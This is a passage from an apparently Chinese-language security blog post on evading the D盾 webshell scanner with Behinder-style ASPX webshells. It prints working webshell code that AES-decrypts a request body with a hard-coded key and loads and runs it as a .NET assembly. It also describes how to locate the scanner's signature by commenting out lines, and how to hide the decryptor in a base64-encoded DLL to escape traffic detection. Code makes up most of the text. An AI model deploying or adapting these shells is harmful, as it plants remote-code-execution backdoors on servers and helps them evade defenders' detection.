
## 2.1 免杀思路

### （2）长句化短

原生的 `aspx` 基本上只有三句代码，我们可以尝试将一些比较长的代码变短。如下：

```csharp
<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.Security.Cryptography"%>
<%
Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
byte[] k = Encoding.Default.GetBytes(Session[0] + ""), c = Request.BinaryRead(Request.ContentLength);
RijndaelManaged rm = new RijndaelManaged();
byte[] xx = rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);
Assembly.Load(xx).CreateInstance("U").Equals(this);
%>
```

![图片描述](upload/attach/202106/883707\_TU32FEQJDBPKS8N.png)

再次细分。`shell01.aspx`

```c
<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.Security.Cryptography"%>
<%
Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
byte[] k = Encoding.Default.GetBytes(Session[0] + ""), c = Request.BinaryRead(Request.ContentLength);
RijndaelManaged rm = new RijndaelManaged();
ICryptoTransform it = rm.CreateDecryptor(k, k);
byte[] xx = it.TransformFinalBlock(c, 0, c.Length);
Assembly.Load(xx).CreateInstance("U").Equals(this);
%>
```

![图片描述](upload/attach/202106/883707\_CPMEHAYPVXG4WDX.png)

### （3）字符串拼接执行

我们逐句注释，查看D盾查杀的特征是什么，发现特征为建立对称的AES 加密子物件，个人理解为创建解密器。将其注释掉之后即不被查杀，未被注释时则被查杀。`shell02.aspx`

```c
ICryptoTransform it = rm.CreateDecryptor(k, k);
```

![图片描述](upload/attach/202106/883707\_Y56U5MRJMKRZZ5P.png)

本意是想利用类似于PHP，对特征码进行拼接，然后一个完整的函数名称，但是在查找相关资料的时候发现C#似乎不像PHP里面有一个`eval()`函数可以执行对拼接完成的函数，因此我们只能自己尝试重写一个类似于`eval()`的函数，然后调用执行它。（额，能力不大够，暂且放一个大佬连接吧，希望看懂的大佬带带弟弟！）

参考链接：

<a href="elink@077K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3u0A6P5i4g2K6M7W2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0p5K6x3o6l9%4z5o6R3I4i4K6y4r3N6i4c8E0i4K6g2X3L8h3g2V1K9i4g2E0i4K6y4p5k6r3W2K6N6s2u0A6j5Y4g2@1k6g2)9J5k6i4m8U0i4K6g2X3M7X3g2D9k6i4k6S2L8Y4c8Q4y4h3k6T1j5Y4y4Q4y4h3k6V1L8%4N6F1i4K6u0W2L8X3!0F1k6g2)9J5k6s2c8S2M7$3E0Q4x3X3c8T1L8r3!0Y4i4K6u0V1j5X3q4A6k6s2g2B7M7#2)9J5k6o6q4Q4x3X3g2F1L8$3&6W2j5$3q4K6k6g2)9J5y4X3c8W2M7s2c8Z5i4K6g2X3x3g2)9J5k6s2g2@1L8g2)9#2k6Y4y4G2N6i4u0U0k6g2)9K6c8r3c8A6M7%4c8J5K9h3u0#2N6r3g2Q4x3X3g2H3j5#2)9#2k6Y4u0W2L8r3g2$3j5h3&6@1i4K6g2X3j5X3u0K6i4K6g2X3k6r3!0%4L8W2)9J5k6h3&6G2L8X3g2Q4x3X3c8@1j5i4y4C8i4K6u0V1j5X3I4G2k6#2)9J5k6r3u0S2K9h3c8#2K9Y4y4Q4x3X3b7I4i4K6u0W2L8X3!0F1k6h3y4S2M7$3f1`.">C#实现将字符串转换成代码并执行</a>

### （4）自定义替换函数

重写AES加密的库函数。额，，能力有限，待定。

## 2.2 dll加载--逃避流量检测

### （1）特征执行写入dll

上面我们讲到D盾主要是对创建解密器的地方会进行查杀，因此我们可以将创建解密器的地方写入到dll中，后期加载dll的时候调用即可。（PS代码基本写完了，但是运行会报错，，改不动，希望有方法的大佬带带弟弟！）

`Payload01`类如下：

```c
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
namespace payload01
{
public class Class1
{
public ICryptoTransform test(byte[] k)
{
RijndaelManaged rm = new RijndaelManaged();
ICryptoTransform it = rm.CreateDecryptor(k, k);
return it;
}
}
}
```

将类编译成dll，并进行base64加密，然后再`aspx`调用执行。`shell03.aspx`
